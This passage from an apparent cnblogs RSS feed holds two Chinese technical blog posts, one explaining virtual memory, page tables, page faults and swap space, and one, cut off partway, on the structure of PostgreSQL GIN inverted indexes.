&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185346513-1960234959.png&quot; alt=&quot;一个使用虚拟寻址的系统_11.png-178.6kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图11：一个使用虚拟寻址的系统&lt;/p&gt;
&lt;p&gt;CPU 通过一个&lt;strong&gt;虚拟地址（virtual address,VA）&lt;/strong&gt;来访问主存，这个虚拟地址在被送到主存之前会先转换成一个物理地址。将虚拟地址转换成物理地址的任务叫做&lt;strong&gt;地址翻译（address translation）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;地址翻译需要 CPU 硬件和操作系统之间的配合。 CPU 芯片上叫做&lt;strong&gt;内存管理单元（Menory Management Unit, MMU）&lt;/strong&gt;的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容由操作系统管理。&lt;/p&gt;
&lt;blockquote readability=&quot;7.3565683646113&quot;&gt;
&lt;p&gt;有少数现代计算机系统依旧在使用物理寻址方式，比如DSP，嵌入式系统，超级计算机系统。这些系统的主要任务是执行单一任务，不像通用性计算机那样需要执行多任务。可以想象到，物理寻址方式更快。这个道理和&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7470460.html&quot;&gt;关于跨平台的一些认识&lt;/a&gt;文章中，理论上java比C++慢的道理是一样的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前面解释完虚拟地址，那么关于文章开头时提的那些疑问，可能有些人心里面都有数了。因为那些地址都是虚拟地址，并非真实的物理内存当中的地址。基本思想已经懂了，那么剩下的我们就更具体的讨论细节。&lt;/p&gt;
&lt;h2 id=&quot;进程地址空间&quot;&gt;进程地址空间&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185002684-1465234212.png&quot; alt=&quot;进程地址空间-12.png-228.3kB&quot;/&gt;&lt;br/&gt;图12:进程地址空间&lt;/p&gt;
&lt;p&gt;上图是一个64位的进程地址空间，编译器在编译程序时，将结果编译成32/64位的地址空间。虚拟寻址方式简化了编译器，链接器的工作。同样也因为虚拟内存，每个进程才能有很大的，一致的，私有的的地址空间。这方便了内存管理，保护了每个进程的地址空间不被其他进程破坏。同时也方便了共享库。&lt;/p&gt;
&lt;h2 id=&quot;虚拟内存也是一种缓存思想&quot;&gt;虚拟内存也是一种缓存思想&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;虚拟内存将主存看成是一个磁盘的高速缓存，主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从概念上来说，虚拟内存被组织成为一个由存放在磁盘上的 N 个连续的字节大小的单元组成的数组，也就是字节数组。每个字节都有一个唯一的虚拟地址作为数组的索引。虚拟内存的地址和磁盘的地址之间建立影射关系。磁盘上活动的数组内容被缓存在主存中。在存储器层次结构中，磁盘(较低层L5，参见我们&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;上篇文章&lt;/a&gt;图4)的数据被分割成块(block)，这些块作为和主存(较高层,L4)之间的传输单元。主存作为虚拟内存(或者说磁盘)的缓存。&lt;/p&gt;
&lt;p&gt;虚拟内存（VM）系统将虚拟内存分割成称为大小固定的虚拟页（Virtual Page,VP），每个虚拟页的大小为固定字节。同样的，物理内存被分割为物理页（Physical Page,PP）,大小也为固定字节（物理页也称作页帧，page frame）。&lt;/p&gt;
&lt;p&gt;在任意时刻，虚拟页面都分为三个不相交的部分：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;未分配的(Unallocated)&lt;/strong&gt;：VM 系统还未分配（或者创建）的页，未分配的页没有任何数据和它们关联，因此不占用任何内存/磁盘空间。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缓存的(Cached)&lt;/strong&gt;：当前已缓存在物理内存中的已分配页。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;未缓存的(UnCached)&lt;/strong&gt;：该页已经映射到磁盘上了，但是还没缓存在物理内存中。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;其中&lt;strong&gt;未分配的VP&lt;/strong&gt;不占用任何的实际物理空间，这点要理解。32位程序地址空间就有4G，至于64G的程序它的地址空间是一个非常大的天文数字(貌似是16777216T)，而目前我们的电脑高配的也就2T磁盘，16G内存。如果64位程序每个VP都映射着实际的PP。无论如何也对应不上的。并且也完全没必要一一映射,&quot;图12:进程地址空间&quot;中可以看到，地址空间内有大量的空白。毕竟程序不可能实际使用那么大的地址空间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184518059-1211588113.png&quot; alt=&quot;VM使用主存来作为缓存-13.png-44.8kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图13：VM使用主存来作为缓存&lt;/p&gt;
&lt;p&gt;上图展示了在一个有 8 个页面的虚拟内存中，虚拟页 0 和 3 还没有被分配，所以在磁盘上不存在。虚拟页 1，4，6 被缓存在物理内存中。虚拟页 2，5，7 已经被映射分配了，但是还没有缓存在主存中。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;当然，那个图上标注的不对,VP 部分， &lt;code&gt;n-p&lt;/code&gt;和&lt;code&gt;N-1&lt;/code&gt;应该分别标注为&lt;code&gt;3&lt;/code&gt;和&lt;code&gt;7&lt;/code&gt;,不过我们找不到更合适的图了，(这种图自己画压力太大了)。所以大家知道我们假设共有8个VP就好了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;页表page-table&quot;&gt;页表(page table)&lt;/h2&gt;
&lt;p&gt;系统必须得有办法判定某个虚拟页是否缓存在主存的某个地方。这具体可分为两种情况。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;已经在主存中，就需要判断出该虚拟页存在于哪个物理页中。&lt;/li&gt;
&lt;li&gt;不在主存中，那么系统必须判断虚拟页存放在磁盘的哪个位置，并且在物理主存中选择一个牺牲页，并将该虚拟页从磁盘复制到 主存，替换这个牺牲页。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这些功能由软硬件联合提供，包括操作系统，CPU中的&lt;strong&gt;内存管理单元（Memory Management Unit,MMU）&lt;/strong&gt;和一个存放在物理内存中叫&lt;strong&gt;页表（page table）&lt;/strong&gt;的数据结构，页表将虚拟页映射到物理页。每次地址翻译硬件将一个虚拟地址转换成物理地址时都会读取页表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185417622-750029923.png&quot; alt=&quot;页表-14.png-76.5kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图14：页表&lt;/p&gt;
&lt;p&gt;上图展示了一个页表的基本结构，页表就是一个&lt;strong&gt;页表条目（Page Table Entry,PTE）&lt;/strong&gt;的数组。虚拟地址的每个页在页表中都有一个对应的PTE。在这里我们假设每个 PTE 是由一个有效位（Valid bit）和一个 n 位地址字段组成的。有效位表明了该虚拟页当前是否被缓存在 主存 中。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有效位为 1，则主存缓存了该虚拟页。地址字段就表示主存中相应的物理页的起始位置。&lt;/li&gt;
&lt;li&gt;有效位为 0，则地址字段的null表示这个虚拟页还未被分配，否则该地址就指向该虚拟页在磁盘上的起始位置。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;页命中与缺页&quot;&gt;页命中与缺页&lt;/h2&gt;
&lt;blockquote readability=&quot;7.3068592057762&quot;&gt;
&lt;p&gt;我们在上篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;中说过缓存命中与不命中的问题，都是缓存思想，在这里肯定也会存在同样的问题。并且磁盘与主存之间的缓存不命中代价肯定大的多。因为L0-L4之间，每级缓存的速度大约相差10倍左右，但是L4主存与L5磁盘之间，它们的速度相差约十万倍。所以主存与磁盘之间交换的页容量是最大的，尽可能的增加命中率。相应的替换策略，操作系统也使用了更加复杂精密的算法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6.2702702702703&quot;&gt;
&lt;p&gt;在上篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;，每次替换的区域，我们用了&lt;strong&gt;块(block)&lt;/strong&gt;,而这里我们却在说&lt;strong&gt;页(page)&lt;/strong&gt;， 其实同一个意思。只是因为历史原因，叫法不同罢了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当CPU想要读取包含在某个虚拟页的内容时，如果该页已经缓存在主存中，也就是&lt;strong&gt;页命中&lt;/strong&gt;。perfect,很完美。但是如果该页没有缓存在主存中，则我们称之为&lt;strong&gt;缺页(page fault)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184841731-1270993019.png&quot; alt=&quot;对VP3中的字的应用会引起不命中-15.png-96.3kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图15：对VP3中的字的应用会引起不命中&lt;/p&gt;
&lt;p&gt;如上图所示，CPU 引用了 VP3 中的内容， VP3 并未缓存在主存中。系统从内存中读取 PTE3,得知 VP3 未被缓存，这会触发了一个&lt;strong&gt;缺页异常&lt;/strong&gt;。缺页异常会调用kernel的缺页异常处理程序，该程序会选择一个牺牲页。如下图所示，牺牲页选择了存放在 PP3 中的 VP4。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184549575-1146386558.png&quot; alt=&quot;VP4被牺牲了-16.png-92.5kB&quot;/&gt;&lt;br/&gt;图16：VP4被牺牲了&lt;/p&gt;
&lt;p&gt;此时如果 VP4 的内容被修改了，kernel会将它复制回磁盘。接下来，kernel从磁盘赋值 VP3 到内存中的 PP3并更新 PTE3。随后返回用户进程。当异常处理程序返回时，它会重启执行导致缺页的指令，当重新执行这条指令时，因为 VP3 已经在主存中了，此时就是页命中了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184627575-818920641.png&quot; alt=&quot;VP3被缓存到PP3-17.png-98.5kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图17：VP3被缓存到PP3&lt;/p&gt;
&lt;p&gt;根据习惯性的叫法，我们在磁盘和内存之间传送页的活动叫做&lt;strong&gt;交换(swapping)&lt;/strong&gt;或者&lt;strong&gt;页面调度(paging)&lt;/strong&gt;。这种交换活动，只有当不命中发生时才会发生，(也就说，系统并不会将磁盘内容预存到内存中)。这种策略被称之为&lt;strong&gt;按需页面调度(demand paging)&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;我们刚才说，缺页错误是一种异常，但是实际上，在计算机系统中，被0除，读写文件，还有上篇文章中我们所说的中断(interrupt)，甚至包括我们代码中写的&lt;code&gt;try catch&lt;/code&gt;，都是一种异常。 比如被0除是intel 的CPU规定的的第0号故障(fault)类型的异常。而读写文件，分别是linux规定的第0号和第1号陷阱(trap)类型的异常。多任务的上下文切换，进程的创建回收等，等与系统中这种异常流的处理密切相关。当然，这是另外一个话题了。我们在这里不做累述。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;虚拟内存作为内存管理和内存保护的工具&quot;&gt;虚拟内存作为内存管理和内存保护的工具&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;理所当然的，每个进程都有一个独立的页表和一个独立的虚拟地址空间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;回到文章开头的问题，比如每个C程序都要调用的 &lt;code&gt;stdio&lt;/code&gt;这个库，不可能为每个进程都添加一份库，内存中只有一份&lt;code&gt;stdio&lt;/code&gt;库的内容，供每个使用该库的进程共享。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108184927809-1322769232.jpg&quot; alt=&quot;共享页面-18.jpg-37.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图18：共享页面&lt;/p&gt;
&lt;p&gt;如上图所示: 第一个进程的的页表将 VP2 映射到 某个物理页面。而第二个进程同样将它的 VP2 映射到 该物理页面。所以该物理页面都被两个进程共享了。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;此时，大家再看一下&quot;图:12 进程地址空间&quot;,就会发现在地址空间当中，&quot;共享库的内存映射区域&quot;对于每个进程起始地址都是相同的。再想想进程之间&lt;strong&gt;共享内存&lt;/strong&gt;的通信方式, 所以说&lt;strong&gt;虚拟内存简化了共享机制&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大家知道，C语言中存在指针，可以直接进行内存操作。因为有了虚拟内存，所以我们的指针操作也不会访问到其他进程的区域，但是哪怕是对于自己的地址空间，很多内存区域也应该是禁止访问的，这不仅包括kernel的区域，也包括自己的只读代码段。那么虚拟内存就提供了这样的一种内存保护工具。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;地址翻译机制&lt;/strong&gt;可以使用一种自然的方式来提供内存的访问控制。PTE 上添加一些额外的控制位来添加权限。每次 CPU 生成一个地址时，地址翻译硬件都会读一个 PTE 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185032231-1556179730.png&quot; alt=&quot;虚拟内存提供内存保护-19.png-30.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图19：虚拟内存提供内存保护&lt;/p&gt;
&lt;p&gt;在上图中，每个 PTE 额外添加了三个控制位， SUP 位表示进程是否必须运行内核模式，READ和WRITE位分别控制页面的读写权限。如果有指令违反了这些控制权限，那么 CPU 会触发一个故障，并将控制传递给内核中的异常处理程序。该种异常一般称为&lt;strong&gt;段错误(segmentation fault)&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;段-和-页&quot;&gt;段 和 页&lt;/h2&gt;
&lt;p&gt;我们明白了页，页是操作系统为了管理主存方便而划分的，对用户不可见。但是思考这种情况，假设一个页的大小是1M。但是某个程序数据加起来也就0.5M，所以在内存和磁盘进行页交换明显的浪费内存了。所以还一种划分方式是&lt;strong&gt;分段&lt;/strong&gt;。上面那个例子，我将该段划分为0.5M，在内存和磁盘之间交换，这样就避免了浪费。&lt;/p&gt;
&lt;p&gt;段是信息的逻辑单元，是根据用户需求而灵活划分的，所以大小不固定，对用户是可见的，提供的是二维地址空间。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;对于段，我没找到比较好的资料，所以也没有理解的更清楚，网上的很多文章都相互抄袭。据我所了解，汇编程序员是可以直接操作段的，&lt;strong&gt;但是我们写高级语言的程序员有相应的API能进行段操作吗？&lt;/strong&gt;所以对于段的相关知识，真心不了解，也希望了解的同学可以在留言区指点批评，或者留言相关的文章链接。我回头会再补充这篇博客。谢谢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;swap分区的作用&quot;&gt;swap分区的作用&lt;/h2&gt;
&lt;p&gt;熟悉linux的同学，应该知道linux有一个swap分区。Swap空间的作用可简单描述为：当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间中的信息被临时保存到Swap空间中，等到那些程序要运行时，再从Swap中恢复保存的数据到内存中。系统总是在物理内存不够时，才进行Swap交换。&lt;/p&gt;
&lt;p&gt;你电脑打开了一个音乐播放器，但是也没播放歌曲，然后你几天不关机，也一直没关闭这个音乐播放器，随着运行的程序越来越多，内存快不够用了，所以操作系统就选择将这个音乐播放器的内存状态(包括堆栈状态等)都写到磁盘上的swap区进行保存。这样就腾出来一部分内存供其他需要运行的程序使用。你啥时候想听歌了，就找到了这个音乐播放器程序操作。此时， 系统会从磁盘中的swap区重新读取该音乐播放器的相关信息，送回内存接着运行。&lt;/p&gt;
&lt;p&gt;在window下也有类作用的硬盘空间，属于对用户不可见的匿名磁盘空间(在C盘)。&lt;/p&gt;
&lt;h2 id=&quot;特别注意按照字面意思swap交换区也可以称为虚拟内存&quot;&gt;&lt;strong&gt;特别注意：按照字面意思，swap交换区也可以称为虚拟内存&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;硬盘上的swap交换区，其实就相当于承担了内存的作用(只是速度很慢罢了)。swap交换区起到了扩大内存的作用。所以从某些意义上来讲，swap区也可以叫做虚拟内存，但是&lt;strong&gt;这个虚拟内存是字面意思&lt;/strong&gt;。和我们本文当中站在计算机系统的角度来解释的虚拟内存不是一个概念。所以特别注意这一点。因为有些人理解的虚拟内存，就是swap交互区。&lt;strong&gt;此虚拟内存非彼虚拟内存&lt;/strong&gt;，所以明白各自的概念和作用。不然和其他人讨论虚拟内存，可能出现驴头不对马嘴的情况。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;linux环境下叫做swap分区，window下这块区域没叫做swap分区，就直接按照字面意思叫做&quot;虚拟内存&quot;了。所以两个含义不同的虚拟内存，读者一定要搞清楚了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;百度百科上对虚拟内存的解释非常混乱&quot;&gt;百度百科上对&lt;strong&gt;虚拟内存&lt;/strong&gt;的解释非常混乱&lt;/h2&gt;
&lt;p&gt;关于虚拟内存,看了&lt;a href=&quot;https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98&quot;&gt;百度百科&lt;/a&gt;的内容，有些地方解释的比较混乱，有些地方是对的，但是有些地方解释的是关于swap分区的内容。如果光从字面意思来看，swap交换区的确可以称为虚拟内存，但是此虚拟内存非彼虚拟内存。百度百科关于这点的介绍比较混乱，百度百科的内容比较多，但是没分清这一点，只会越来越混乱。我又查了&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98&quot;&gt;维基百科&lt;/a&gt;的内容，该词条内容不长，但是下面这段话很重要。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;注意：虚拟内存不只是“用磁盘空间来扩展物理内存”的意思——这只是扩充内存级别以使其包含硬盘驱动器而已。把内存扩展到磁盘只是使用虚拟内存技术的一个结果，它的作用也可以通过覆盖或者把处于不活动状态的程序以及它们的数据全部交换到磁盘上等方式来实现。对虚拟内存的定义是基于对地址空间的重定义的，即把地址空间定义为“连续的虚拟内存地址”，以借此“欺骗”程序，使它们以为自己正在使用一大块的“连续”地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以我认为百度百科的解释是混乱的，而维基百科上的应该才是正确的。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;两篇关于内存的文章都写完了。因为本人才疏学浅，若有理解错误或解释不清楚的地方，希望各位读者打脸批评。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:00:00 +0000</pubDate>
<dc:creator>eleven_yw</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yaoxiaowen/p/7805964.html</dc:identifier>
</item>
<item>
<title>浅谈postgresql的GIN索引(通用倒排索引) - 非我在</title>
<link>http://www.cnblogs.com/flying-tiger/p/6704931.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flying-tiger/p/6704931.html</guid>
<description>&lt;h2 id=&quot;倒排索引原理&quot;&gt;1.倒排索引原理&lt;/h2&gt;
&lt;p&gt;倒排索引来源于搜索引擎的技术，可以说是搜索引擎的基石。正是有了倒排索引技术，搜索引擎才能有效率的进行数据库查找、删除等操作。在详细说明倒排索引之前，我们说一下与之相关的正排索引并与之比较。&lt;/p&gt;
&lt;h3 id=&quot;正排索引&quot;&gt;1.1正排索引&lt;/h3&gt;
&lt;p&gt;在搜索引擎中，正排表是以文档的ID为关键字，表中记录文档中每个字的位置信息，查找时扫描表中每个文档中字的信息直到找出所有包含查询关键字的文档。&lt;br/&gt;正排表结构如图1所示，这种组织方法在建立索引的时候结构比较简单，建立比较方便且易于维护;因为索引是基于文档建立的，若是有新的文档加入，直接为该文档建立一个新的索引块，挂接在原来索引文件的后面。若是有文档删除，则直接找到该文档号文档对应的索引信息，将其直接删除。但是在查询的时候需对所有的文档进行扫描以确保没有遗漏，这样就使得检索时间大大延长，检索效率低下。&lt;br/&gt;尽管正排表的工作原理非常的简单，但是由于其检索效率太低，除非在特定情况下，否则实用性价值不大。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109213621263-1728868260.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;倒排索引&quot;&gt;1.2倒排索引&lt;/h3&gt;
&lt;p&gt;倒排表以字或词为关键字进行索引，表中关键字所对应的记录表项记录了出现这个字或词的所有文档，一个表项就是一个字表段，它记录该文档的ID和字符在该文档中出现的位置情况。&lt;br/&gt;由于每个字或词对应的文档数量在动态变化，所以倒排表的建立和维护都较为复杂，但是在查询的时候由于可以一次得到查询关键字所对应的所有文档，所以效率高于正排表。在全文检索中，检索的快速响应是一个最为关键的性能，而索引建立由于在后台进行，尽管效率相对低一些，但不会影响整个搜索引擎的效率。&lt;br/&gt;倒排表的结构图如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109213806903-1456787584.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;postgresql中的倒排索引&quot;&gt;2.postgresql中的倒排索引&lt;/h2&gt;
&lt;h3 id=&quot;概述&quot;&gt;2.1 概述&lt;/h3&gt;
&lt;p&gt;GIN(Generalized Inverted Index, 通用倒排索引)是一个存储对(key, posting list)集合的索引结构，其中key是一个键值，而posting list 是一组出现过key的位置。如(‘hello’, ’14:2 23:4’)中，表示hello在14:2和23:4这两个位置出现过，在PG中这些位置实际上就是元组的tid。&lt;/p&gt;
&lt;p&gt;在表中的每一个属性，在建立索引时，都可能会被解析为多个键值，所以同一个元组的tid可能会出现在多个key的posting list中。&lt;/p&gt;
&lt;p&gt;通过这种索引结构可以快速的查找到包含指定关键字的元组，因此GIN索引特别适用于支持全文搜索，而PG的GIN索引模块也就是为了支持全文搜索而开发的。&lt;/p&gt;
&lt;h3 id=&quot;扩展性&quot;&gt;2.2 扩展性&lt;/h3&gt;
&lt;p&gt;GIN索引具有很好的可扩展性，允许在开发自定义数据类型时由该数据类型的领域专家（而非数据库专家）设计适当的访问方法，这些访问方法只需考虑对于数据类型本身的语义处理，GIN索引自身可以处理并发控制、日志记录、搜索树结构等操作。&lt;/p&gt;
&lt;p&gt;定义一个GIN访问方法所要做的就是实现3个用户定义的方法，这些方法定义了键值、键值与键值之间的关系、被索引值、能够使用索引的查询以及部分匹配。这些方法是:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int compare(Datum a, Datum b)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比较两个键（不是被索引项）并且返回一个整数，整数可以是小于零、零、大于零， 分别表示第一个键小于、等于、大于第二个键。空值键不会被传递给这个函数。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Datum *extractValue(Datum itemValue, int32 *nkeys, bool **nullFlags)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据参数inputValue生成一个键值数组，并返回其指针，键值数组中元素的个数存放在另一个参数nkeys中。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Datum *extractQuery(Datum query, int32 *nkeys, StrategyNumber n, bool
**pmatch, Pointer **extra_data, bool **nullFlags, int32 *searchMode)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据参数query生成一个用于查询的键值数组，并返回其指针。&lt;/p&gt;
&lt;p&gt;extractQuery通过参数n指定的操作符策略号来决定query的数据类型以及需要提取的键值，返回键值数组的长度存放在nkeys参数中。如果query中不包含键值，则nkeys可以为0或者-1：nkeys = 0 表示索引中所有值都满足查询，将执行完全索引扫描(查询null时是这样); nkeys = -1 表示索引中没有键值满足查询，跳过索引扫描。&lt;/p&gt;
&lt;p&gt;在部分匹配时，输出参数pmatch记录返回的键值数组中的每一个键值是否请求部分匹配。&lt;/p&gt;
&lt;p&gt;输出参数extra_data用来向consistent和comparPartial方法传递用户自定义需要的数据。&lt;/p&gt;
&lt;p&gt;一个操作符类必须提供一个函数检查一个被索引的项是否匹配查询。有两种形式， 一个布尔函数consistent，以及一个三元函数triConsistent。 triConsistent覆盖了两者的功能，因此提供一个足矣。但是， 如果布尔函数的计算代价要更低，两者都提供就会有好处。如果只提供布尔变体， 一些基于在取得所有键之前拒绝索引项的优化将会被禁用。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;bool consistent(bool check[], StrategyNumber n, Datum query, int32 nkeys, Pointer extra_data[], bool *recheck, Datum queryKeys[], bool nullFlags[])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果一个被索引项满足（如果重新检查指示被返回，则表示可能满足）有策略号 n的查询操作符，则返回 TRUE。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GinTernaryValue triConsistent(GinTernaryValue check[], StrategyNumber n, Datum query, int32 nkeys, Pointer extra_data[], Datum queryKeys[], bool nullFlags[])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;triConsistent类似于consistent，但不是一个布尔的 check[]，对每个键有三种可能值：GIN_TRUE、 GIN_FALSE和GIN_MAYBE。GIN_FALSE和 GIN_TRUE具有和常规布尔值相同的含义。GIN_MAYBE 意味着键的存在未知。当GIN_MAYBE值出现时，如果项匹配 （不管该索引项是否包含对应的查询键），该函数应该只返回 GIN_TRUE。 同样地，如果项不匹配（不管它是否包含 GIN_MAYBE 键），该函数必须只返回 GIN_FALSE。 如果结果依赖于 GIN_MAYBE 项，即无法根据已知查询键确认或拒绝匹配， 该函数必须返回 GIN_MAYBE。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int comparePartial(Datum partial_key, Datum key, StrategyNumber n, Pointer extra_data)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将部分匹配的查询与索引值进行比较，返回值为负值表示两者不匹配，但继续索引扫描；返回值为0表示两者匹配；返回值为正值表示停止扫描。&lt;/p&gt;
&lt;p&gt;要支持&quot;部分匹配&quot;查询，一个操作符类必须提供comparePartial 方法，并且它的extractQuery方法必须在遇到一个部分匹配查询时设置 pmatch参数&lt;/p&gt;
&lt;p&gt;所以在PG中添加一种新的数据类型并且让GIN支持该数据类型，则需要完成以下步骤：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
1.添加数据类型

2.为新数据类型实现并注册各种操作符所需要的函数，然后创建新类型的操作符

3.用CREATE OPERATOR CLASS为新的数据类型创建一个操作符类，该语句需要指定GIN索引所需要的3个支持函数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对以上的函数云里雾里？ 我建议你可以看看contrib\cube模块。这个模块实现了一种数据类型cube来表示多维立方体。同样他实现了以上3个函数(虽然针对的是gist和b-tree，但是大体相似)。&lt;/p&gt;
&lt;h3 id=&quot;gin索引结构&quot;&gt;2.3 GIN索引结构&lt;/h3&gt;
&lt;h4 id=&quot;逻辑结构&quot;&gt;2.3.1 逻辑结构&lt;/h4&gt;
&lt;p&gt;GIN索引在逻辑上可以看成一个relation，该relation有两种结构：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;只索引基表的一列&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109214024700-635390362.png&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;索引基表的多列(复合、多列索引)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/579102/201711/579102-20171109214133403-53790500.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那我们可以知道在这种结构下，对于基表中不同列的相同的key，在GIN索引中也会当作不同的key来处理。&lt;/p&gt;
&lt;h4 id=&quot;物理结构&quot;&gt;2.3.2 物理结构&lt;/h4&gt;
&lt;p&gt;GIN索引在物理存储上包含如下内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1. Entry：GIN索引中的一个元素，可以认为是一个词位，也可以理解为一个key

2. Entry tree：在Entry上构建的B树

3. posting list：一个Entry出现的物理位置(heap ctid, 堆表行号)的链表

4. posting tree：在一个Entry出现的物理位置链表(heap ctid, 堆表行号)上构建的B树，所以posting tree的KEY是ctid，而entry tree的KEY是被索引的列的值

5. pending list：索引元组的临时存储链表，用于fastupdate模式的插入操作&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从上面可以看出GIN索引主要由Entry tree和posting tree（or posting list）组成，其中Entry tree是GIN索引的主结构树，posting tree是辅助树。&lt;/p&gt;
&lt;p&gt;entry tree类似于b+tree，而posting tree则类似于b-tree。&lt;/p&gt;
&lt;p&gt;另外，不管entry tree还是posting tree，它们都是按KEY有序组织的。&lt;/p&gt;
&lt;h3 id=&quot;gin索引的insert和fastupdate优化&quot;&gt;2.4 GIN索引的insert和fastupdate优化&lt;/h3&gt;
